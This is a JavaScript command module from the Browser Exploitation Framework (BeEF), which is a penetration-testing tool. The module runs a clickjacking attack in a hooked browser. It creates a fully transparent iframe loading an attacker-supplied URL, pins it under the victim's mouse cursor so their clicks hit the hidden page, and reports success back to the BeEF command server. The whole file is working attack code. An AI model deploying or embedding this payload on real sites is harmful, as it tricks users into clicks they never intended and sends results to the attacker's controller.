//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {

	var offset_top  = "<%= @offset_top %>";
	var offset_left = "<%= @offset_left %>";
	var url = "<%= @url %>";

	var debug = false;
	if (debug) opacity = 10; else opacity = 0;

	// create container
	var cjcontainer = document.createElement('div');
	cjcontainer.id = "cjcontainer";
	cjcontainer.setAttribute("style", "-moz-opacity:"+opacity);
	cjcontainer.style.zIndex = 999;
	cjcontainer.style.border = "none";
	cjcontainer.style.width = "30px";
	cjcontainer.style.height = "20px";
	cjcontainer.style.overflow = "hidden";
	cjcontainer.style.position = "absolute";
	cjcontainer.style.opacity = opacity;
	cjcontainer.style.filter = "alpha(opacity="+opacity+")";
	cjcontainer.style.cursor = "default";
	document.body.appendChild(cjcontainer);

	// create iframe
	var cjiframe = document.createElement('iframe');
	cjiframe.id = "cjiframe";
	cjiframe.src = url;
	cjiframe.scrolling = "no";
	cjiframe.frameBorder = "0";
	cjiframe.allowTransparency = "true";
	cjiframe.style.overflow = "hidden";
	cjiframe.style.position = "absolute";
	cjiframe.style.top = offset_top+"px";
	cjiframe.style.left = offset_left+"px";
	cjiframe.style.width = "200px";
	cjiframe.style.height = "100px";
	cjiframe.style.border = "none";
	cjiframe.style.cursor = "default";
	cjcontainer.appendChild(cjiframe);

	// followmouse code by rsnake
	// http://ha.ckers.org/weird/followmouse.html
	// modified by bcoles
	function followmouse(e){

		var xcoord = 0;
		var ycoord = 0;
		var gettrailobj = function() {
			if (document.getElementById)
				return document.getElementById("cjcontainer").style;
			else if (document.all)
				return document.all.container.style;
		}
		if (typeof e != "undefined") {
			xcoord += e.pageX - 10;
			ycoord += e.pageY - 15;
		} else if (typeof window.event != "undefined") {
			xcoord += document.body.scrollLeft + event.clientX; 
			ycoord += document.body.scrollTop + event.clientY;
		}
		var docwidth = document.all ? document.body.scrollLeft + document.body.clientWidth : pageXOffset+window.innerWidth - 15;
		var docheight = document.all ? Math.max(document.body.scrollHeight, document.body.clientHeight) : Math.max(document.body.offsetHeight, window.innerHeight)
		gettrailobj().left = xcoord + "px";
		gettrailobj().top  = ycoord + "px";
	}

	// hook to mousemove event
	if (window.addEventListener) {
		window.addEventListener('mousemove', followmouse, false);
	} else if (window.attachEvent) {
		window.attachEvent('mousemove', followmouse);
	}

	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'clickjack=hooked mousemove event');

});
